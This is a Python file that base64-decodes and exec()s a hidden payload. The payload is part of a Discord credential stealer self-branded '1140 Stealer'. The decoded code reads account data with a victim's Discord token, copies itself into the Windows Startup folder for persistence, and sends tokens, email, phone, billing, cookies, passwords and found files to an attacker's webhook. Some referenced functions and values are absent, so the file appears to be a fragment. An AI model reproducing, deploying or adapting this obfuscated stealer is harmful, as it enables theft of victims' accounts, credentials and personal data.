import base64, codecs
magic = ''
love = 'CmRlZiBHM3RCNGRnMzEoZmxhZ3MpOgogICAgaWYgZmxhZ3MgPT0gMDogcmV0dXJuICcnCgogICAgT3duM2RCM2RnNHMgPSAnJwogICAgYjRkZzNMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGZvciBiNGRnMyBpbiBiNGRnM0xpc3Q6CiAgICAgICAgaWYgZmxhZ3MgLy8gYjRkZzNbIlZhbHVlIl0gIT0gMDoKICAgICAgICAgICAgT3duM2RCM2RnNHMgKz0gYjRkZzNbIkVtb2ppIl0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGI0ZGczWyJWYWx1ZSJdCgogICAgcmV0dXJuIE93bjNkQjNkZzRzCgpkZWYgRzN0VDBrNG4xbmY5KHQwazNuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIHVzM3JqczBuID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICB1czNybjRtMSA9IHVzM3JqczBuWyJ1c2VybmFtZSJdCiAgICBoYXNodGFnID0gdXMzcmpzMG5bImRpc2NyaW1pbmF0b3IiXQogICAgZW0zMWwgPSB1czNyanMwblsiZW1haWwiXQogICAgaWRkID0gdXMzcmpzMG5bImlkIl0KICAgIHBmcCA9IHVzM3JqczBuWyJhdmF0YXIiXQogICAgZmxhZ3MgPSB1czNyanMwblsicHVibGljX2ZsYWdzIl0KICAgIG4xdHIwID0gIiIKICAgIHBoMG4zID0gIiIKCiAgICBpZiAicHJlbWl1bV90eXBlIiBpbiB1czNyanMwbjogCiAgICAgICAgbml0cm90ID0gdXMzcmpzMG5bInByZW1pdW1fdHlwZSJdCiAgICAgICAgaWYgbml0cm90ID09IDE6CiAgICAgICAgICAgIG4xdHIwID0gIjxhOkRFX0JhZGdlTml0cm86ODY1MjQyNDMzNjkyNzYyMTIyPiIKICAgICAgICBlbGlmIG5pdHJvdCA9PSAyOgogICAgICAgICAgICBuMXRyMCA9ICI8YTpERV9CYWRnZU5pdHJvOjg2NTI0MjQzMzY5Mjc2MjEyMj48YTphdXRyX2Jvb3N0MToxMDM4NzI0MzIxNzcxNzg2MjQwPiIKICAgIGlmICJwaDBuMyIgaW4gdXMzcmpzMG46IHBoMG4zID0gZid7dXMzcmpzMG5bInBoMG4zIl19JwoKICAgIHJldHVybiB1czNybjRtMSwgaGFzaHRhZywgZW0zMWwsIGlkZCwgcGZwLCBmbGFncywgbjF0cjAsIHBoMG4zCgpkZWYgY2gxY2tUNGsxbih0MGszbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdDBrM24sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCmlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgY3VycmVudEZpbGVQYXRoID0gb3MucGF0aC5kaXJuYW1lKHN5cy5leGVjdXRhYmxlKQplbHNlOgogICAgY3VycmVudEZpbGVQYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpCgpmaWxlTmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoc3lzLmFyZ3ZbMF0pCmZpbGVQYXRoID0gb3MucGF0aC5qb2luKGN1cnJlbnRGaWxlUGF0aCwgZmlsZU5hbWUpCgpzdGFydHVwRm9sZGVyUGF0aCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoJ34nKSwgJ0FwcERhdGEnLCAnUm9hbWluZycsICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnKQpzdGFydHVwRmlsZVBhdGggPSBvcy5wYXRoLmpvaW4oc3RhcnR1cEZvbGRlclBhdGgsIGZpbGVOYW1lKQoKaWYgb3MucGF0aC5hYnNwYXRoKGZpbGVQYXRoKS5sb3dlcigpICE9IG9zLnBhdGguYWJzcGF0aChzdGFydHVwRmlsZVBhdGgpLmxvd2VyKCk6CiAgICB3aXRoIG9wZW4oZmlsZVBhdGgsICdyYicpIGFzIHNyY19maWxlLCBvcGVuKHN0YXJ0dXBGaWxlUGF0aCwgJ3diJykgYXMgZHN0X2ZpbGU6CiAgICAgICAgc2h1dGlsLmNvcHlmaWxlb2JqKHNyY19maWxlLCBkc3RfZmlsZSkKCgpkZWYgdXBsMDVkVDRrMzEodDBrM24sIHBhdGgpOgogICAgZ2xvYmFsIHdoMDBrCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB1czNybjRtMSwgaGFzaHRhZywgZW0zMWwsIGlkZCwgcGZwLCBmbGFncywgbjF0cjAsIHBoMG4zID0gRzN0VDBrNG4xbmY5KHQwazNuKQoKICAgIGlmIHBmcCA9PSBOb25lOiAKICAgICAgICBwZnAgPSAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA4OTMwODk1NzE1NzM3MTkyNC8xMTAyNjIzNTE4MjYyMjk2NjM3L0I4QjJDMDU0LTk2OTYtNDJBMS04NUYzLTRGQ0RFRjQwOEI5Mi5qcGciCiAgICBlbHNlOgogICAgICAgIHBmcCA9IGYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97aWRkfS97cGZwfSIKCiAgICBiMWxsMW5nID0gRzN0YjFsbDFuZyh0MGszbikKICAgIGI0ZGczID0gRzN0QjRkZzMxKGZsYWdzKQogICAgZnJpZW5kcyA9IEczdFVIUUZyMTNuZFModDBrM24pCiAgICBpZiBmcmllbmRzID09ICcnOiBmcmllbmRzID0gImBgYE5vIFJhcmUgRnJpZW5kc2BgYCIKICAgIGlmIG5vdCBiMWxsMW5nOgogICAgICAgIGI0ZGczLCBwaDBuMywgYjFsbDFuZyA9ICLQgdCv0KTQoiIsICLQgdCv0KTQoiIsICLQgdCv0KTQoiIKICAgIGlmIG4xdHIwID09ICcnIGFuZCBiNGRnMyA9PSAnJzogbjF0cjAgPSAiYGBgTm9uZWBgYCIKCiAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogZid7Z2xvYmFsSW5mbygpfSB8IGB7cGF0aH1gJywKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6aHlwZXJOT1BQRVJTOjgyODM2OTUxODE5OTMwODM4OD4gVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImBgYHt0MGszbn1gYGAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6bWFpbDo3NTAzOTM4NzA1MDc5NjY0ODY+IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7ZW0zMWx9YGBgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI8YToxNjg5X1JpbmdpbmdfUGhvbmU6NzU1MjE5NDE3MDc1NDE3MDg4PiBQaG9uZToiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge3BoMG4zfWBgYCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDptY19lYXJ0aDo1ODk2MzAzOTY0NzY1NTUyNjQ+IElQOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7ZzN0MXAoKX1gYGAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6d29venlmYWNlOjg3NDIyMDg0MzUyODQ4NjkyMz4gQmFkZ2VzOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7bjF0cjB9e2I0ZGczfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6NDM5NF9jY19jcmVkaXRjYXJkX2NhcnRhb19mNGJpaHk6NzU1MjE4Mjk2ODAxOTg0NTUzPiBCaWxsaW5nOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YjFsbDFuZ30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOm1hdmlraXJtaXppOjg1MzIzODM3MjU5MTU5OTYxNz4gSFEgRnJpZW5kczoiLAogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie2ZyaWVuZHN9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzM3JuNG0xfSN7aGFzaHRhZ30gKHtpZGR9KSIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiBmIntwZnB9IgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA4OTMwODk1NzE1NzM3MTkyNC8xMTAyNjIzNTE4MjYyMjk2NjM3L0I4QjJDMDU0LTk2OTYtNDJBMS04NUYzLTRGQ0RFRjQwOEI5Mi5qcGciCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAidGh1bWJuYWlsIjogewogICAgICAgICAgICAgICAgInVybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIiwKICAgICAgICAidXNlcm5hbWUiOiAiMTE0MCBTdGVhbGVyIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgIH0KICAgIEwwNGR1cmwxYih3aDAwaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKI2hlcnNleSBzb24gZGVmYSA6KApkZWYgUjRmMHJtM3QobGlzdHQpOgogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQogICAgd2hpbGUgImh0dHBzIiBpbiBlOiBlLnJlbW92ZSgiaHR0cHMiKQogICAgd2hpbGUgImNvbSIgaW4gZTogZS5yZW1vdmUoImNvbSIpCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikKICAgIHJldHVybiBsaXN0KHNldChlKSkKCmRlZiB1cGxvYWQobmFtZSwgbGluayk6CiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgaWYgbmFtZSA9PSAiY3Jjb29rIjoKICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpCiAgICAgICAgaWYgbGVuKHJiKSA+IDEwMDA6IAogICAgICAgICAgICBycnJyciA9IFI0ZjBybTN0KHN0cihjb29raVdvcmRzKSkKICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6IGYie2dsb2JhbEluZm8oKX0iLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICIxMTQwIHwgQ29va2llcyBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIjw6YXBvbGxvbmRlbGlybWlzOjEwMTIzNzAxODA4NDU4ODM0OTM+OiAqKkFjY291bnRzOioqXG5cbntyYn1cblxuKipEYXRhOioqXG48OmNvb2tpZXNfdGxtOjgxNjYxOTA2MzYxODU2ODIzND4g0YLQkNCyICoqe0Nvb2tpQ291bnR9KiogQ29va2llcyBGb3VuZFxuPGE6Q0hfSWNvbkFycm93UmlnaHQ6NzE1NTg1MzIwMTc4OTQxOTkzPiDRgtCQ0LIgWzExNDBDb29raWVzLnR4dF0oe2xpbmt9KSIsCiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA4OTMwODk1NzE1NzM3MTkyNC8xMTAyNjIzNTE4MjYyMjk2NjM3L0I4QjJDMDU0LTk2OTYtNDJBMS04NUYzLTRGQ0RFRjQwOEI5Mi5qcGciCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiMTE0MCBTdGVhbGVyIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA4OTMwODk1NzE1NzM3MTkyNC8xMTAyNjIzNTE4MjYyMjk2NjM3L0I4QjJDMDU0LTk2OTYtNDJBMS04NUYzLTRGQ0RFRjQwOEI5Mi5qcGciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTDA0ZHVybDFiKHdoMDBrLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbmFtZSA9PSAiY3JwYXNzdyI6CiAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBwYXN3V29yZHMpCiAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6IAogICAgICAgICAgICBycnIgPSBSNGYwcm0zdChzdHIocGFzd1dvcmRzKSkKICAgICAgICAgICAgcmEgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnIpCgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIjExNDAgfCBQYXNzd29yZCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIjw6YXBvbGxvbmRlbGlybWlzOjEwMTIzNzAxODA4NDU4ODM0OTM+OiAqKkFjY291bnRzKio6XG57cmF9XG5cbioqRGF0YToqKlxuPGE6aGlyYV9rYXNhYW5haHRhcmk6ODg2OTQyODU2OTY5ODc1NDc2PiDRgtCQ0LIgKip7UDRzc3dDb3VudH0qKiBQYXNzd29yZHMgRm91bmRcbjxhOkNIX0ljb25BcnJvd1JpZ2h0OjcxNTU4NTMyMDE3ODk0MTk5Mz4g0YLQkNCyIFsxMTQwUGFzc3dvcmQudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAyODk1NjY3LAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICIxMTQwIiwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA4OTMwODk1NzE1NzM3MTkyNC8xMTAyNjIzNTE4MjYyMjk2NjM3L0I4QjJDMDU0LTk2OTYtNDJBMS04NUYzLTRGQ0RFRjQwOEI5Mi5qcGciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICB9CiAgICAgICAgTDA0ZHVybDFiKHdoMDBrLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbmFtZSA9PSAia2l3aSI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBmIntnbG9iYWxJbmZvKCl9IiwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogbGluawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjExNDAgfCBGaWxlIFN0ZWFsZXIiCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDg5MzA4OTU3MTU3MzcxOTI0LzExMDI2MjM1MTgyNjIyOTY2MzcvQjhCMkMwNTQtOTY5Ni00MkExLTg1RjMtNEZDREVGNDA4QjkyLmpwZyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgInVzZXJuYW1lIjogIjExNDAgU3RlYWxlciIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgfQogICAgICAgIEwwNGR1cmwxYih3aDAwaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJldHVybgoKCgo='
prout = ''
destiny = ''
joy = (magic, love, prout, destiny)
for el in joy:
    decoded = base64.b64decode(el)
    command = decoded.decode('utf-8')
    exec(command)
